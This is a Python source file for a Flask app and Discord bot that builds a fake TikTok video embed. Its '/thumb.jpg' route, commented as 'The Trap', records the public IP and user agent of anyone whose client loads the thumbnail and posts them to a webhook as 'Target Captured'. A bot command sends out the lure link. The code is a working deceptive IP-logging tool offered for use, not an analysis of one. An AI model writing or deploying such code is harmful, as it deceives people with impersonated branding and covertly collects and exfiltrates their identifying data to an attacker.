# language: Python, file: app.py
import os
import socket
import requests
import threading
import discord
from discord.ext import commands
from flask import Flask, request, render_template_string, redirect, send_file

# Force IPv4 to prevent Railway boot hangs
_orig_getaddrinfo = socket.getaddrinfo
def getaddrinfo_ipv4(host, port, family=0, type=0, proto=0, flags=0):
    return _orig_getaddrinfo(host, port, socket.AF_INET, type, proto, flags)
socket.getaddrinfo = getaddrinfo_ipv4

app = Flask(__name__)

# --- CONFIGURATION ---
BOT_TOKEN = os.environ.get("BOT_TOKEN")
WEBHOOK_URL = os.environ.get("WEBHOOK_URL")
RAILWAY_URL = "https://rnbw-production.up.railway.app"
# ---------------------

# 1. The OpenGraph page Discord crawls to build the video player
@app.route('/')
def index():
    return """
    <!DOCTYPE html>
    <html>
    <head>
        <meta property="og:type" content="video.other">
        <meta property="og:site_name" content="TikTok">
        <meta property="og:title" content="TikTok - Make Your Day">
        <meta property="og:description" content="1.2M views • 2 hours ago">
        
        <!-- Forces the big video player -->
        <meta property="og:video" content="https://rnbw-production.up.railway.app/video.mp4">
        <meta property="og:video:secure_url" content="https://rnbw-production.up.railway.app/video.mp4">
        <meta property="og:video:type" content="video/mp4">
        <meta property="og:video:width" content="720">
        <meta property="og:video:height" content="1280">
        
        <!-- Point the thumbnail to your trap route -->
        <meta property="og:image" content="https://rnbw-production.up.railway.app/thumb.jpg">
        
        <script>
            // If they somehow click the title, grab and redirect
            window.location.href = "https://www.tiktok.com/@only.edits_cc/video/7689816505713790240";
        </script>
    </head>
    <body></body>
    </html>
    """

# 2. The Trap: When Discord (or the user) fetches the thumbnail, grab the IP.
@app.route('/thumb.jpg')
def thumb():
    ip = request.headers.get('CF-Connecting-IP', request.remote_addr)
    ua = request.headers.get('User-Agent', 'Unknown')

    # Ignore Discord's own proxy to avoid logging their servers (optional, remove if you want to see everything)
    if "Discordbot" not in ua:
        payload = {
            "embeds": [{
                "title": "Target Captured",
                "color": 65280,
                "fields": [
                    {"name": "Public IP", "value": f"```{ip}```", "inline": False},
                    {"name": "User Agent", "value": f"```{ua[:100]}...```", "inline": False}
                ]
            }]
        }
        if WEBHOOK_URL:
            requests.post(WEBHOOK_URL, json=payload)

    # Serve a real TikTok thumbnail so the embed doesn't break
    # Replace this URL with a direct link to a TikTok thumbnail
    img_url = "https://p16-sign-va.tiktokcdn.com/tos-useast2a-p-0037-euttp/84ec996fcd0340e0a1135ec10c52c713_1692823451~tplv-tiktokx-cropcenter:1080:1080.jpeg"
    
    # Fetch and return the image
    resp = requests.get(img_url, stream=True)
    return send_file(resp.raw, mimetype='image/jpeg')

# 3. The Fake Video File
@app.route('/video.mp4')
def fake_video():
    return app.response_class(
        response=b'\x00\x00\x00\x18ftypmp42\x00\x00\x00\x00mp42isom',
        status=200,
        mimetype='video/mp4'
    )

# --- DISCORD BOT ---
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents)

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user}', flush=True)

@bot.command()
async def send(ctx):
    # Sending the raw URL triggers Discord to crawl and build the video player
    await ctx.send(f"<{RAILWAY_URL}>")

def run_bot():
    if not BOT_TOKEN:
        print("ERROR: BOT_TOKEN missing.", flush=True)
        return
    try:
        bot.run(BOT_TOKEN)
    except Exception as e:
        print(f"BOT CRASHED: {e}", flush=True)

threading.Thread(target=run_bot, daemon=True).start()
